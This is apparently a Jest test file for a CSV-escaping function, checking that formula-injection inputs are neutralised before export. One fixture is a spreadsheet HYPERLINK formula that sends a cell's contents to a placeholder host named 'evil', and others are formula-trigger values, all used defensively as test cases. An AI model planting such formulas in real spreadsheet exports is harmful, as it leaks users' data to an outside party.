import { escapeCsvField } from './banner.service';

describe('escapeCsvField', () => {
  it.each([
    [
      '=HYPERLINK("http://evil/?"&A2,"x")',
      `"'=HYPERLINK(""http://evil/?""&A2,""x"")"`,
    ],
    ['+1+1', "'+1+1"],
    ['-2+3', "'-2+3"],
    ['@SUM(A1:A2)', "'@SUM(A1:A2)"],
    ['\tcmd', "'\tcmd"],
    ['plain title', 'plain title'],
    ['a,b', '"a,b"'],
    ['line\rbreak', '"line\rbreak"'],
    [null, ''],
    [3, '3'],
  ])('%p → %p', (input, expected) => {
    expect(escapeCsvField(input)).toBe(expected);
  });
});
